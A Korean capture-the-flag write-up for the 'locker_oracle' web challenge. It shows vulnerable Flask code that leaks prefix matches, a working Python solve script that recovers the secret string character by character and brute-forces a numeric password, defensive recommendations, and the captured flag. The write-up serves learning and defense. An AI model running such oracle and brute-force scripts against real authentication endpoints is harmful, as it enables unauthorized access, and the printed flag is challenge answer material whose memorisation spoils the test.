## locker_oracle

> 문제 설명: 서버가 시작할 때 4자리 영소문자+숫자 랜덤 문자열(`rand_str`)과 100~200 사이 랜덤 숫자(`rand_num`)를 생성합니다. `locker_num`과 `password`를 입력받아 둘 다 일치하면 flag를 출력하는 웹 문제입니다.

### **취약점: Prefix Oracle (정보 누출)**

```python
if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
    if locker_num == rand_str and password == str(rand_num):
        return render_template("index.html", result = "FLAG:" + FLAG)
    return render_template("index.html", result = "Good")
else:
    return render_template("index.html", result = "Wrong!")
```

`locker_num`이 `rand_str`의 **접두사(prefix)와 일치하는지 여부**를 응답(`"Good"` vs `"Wrong!"`)으로 그대로 알려줍니다. 이로 인해 전수조사 대신, **한 글자씩 순차적으로 확정**하는 방식으로 `rand_str`을 알아낼 수 있습니다.

- 완전탐색: 36⁴ ≈ 1,679,616회
- Prefix Oracle 이용: 최대 4 × 36 = **144회**로 축소

`rand_num`은 100~200(101가지)으로 범위가 작아 그냥 순차 brute force로 충분합니다.

### Solve 😈

```python
import requests
import string

url = "http://host:port/"
alphanumeric = string.ascii_lowercase + string.digits

# 1. rand_str을 한 글자씩 prefix oracle로 확정
rand_str = ""
for _ in range(4):
    for ch in alphanumeric:
        candidate = rand_str + ch
        r = requests.post(url, data={"locker_num": candidate, "password": ""})
        if "Wrong!" not in r.text:
            rand_str = candidate
            break

print("rand_str:", rand_str)

# 2. rand_num brute force (100~200)
for num in range(100, 201):
    r = requests.post(url, data={"locker_num": rand_str, "password": str(num)})
    if "FLAG" in r.text:
        print(r.text)
        break
```

### 근본 원인 및 방어법

- **원인**: 입력값 일치 여부를 전체 일치가 아닌 부분(prefix) 일치로 분기 처리하여, 응답을 통해 정답을 점진적으로 유출(Side-channel / Oracle)
- **방어법**
  - 비교는 반드시 **전체 값 일치 여부만** 응답에 반영 (`rand_str == locker_num`인 경우와 아닌 경우만 구분, 부분 일치 정보 노출 금지)
  - 민감한 값 비교 시 응답 메시지/타이밍 차이로 정보가 새어 나가지 않도록 설계 (예: 상수 시간 비교, 동일한 응답 메시지 사용)
  - 가능하다면 비밀값은 추측 가능한 짧은 랜덤 문자열 대신 충분히 긴 토큰 사용 및 시도 횟수 제한(rate limiting) 적용

### 결과

FLAG:DH{2e583205a2555b8890d141b51cee41379cead9a65a957e72d4a99568c0a2f955}
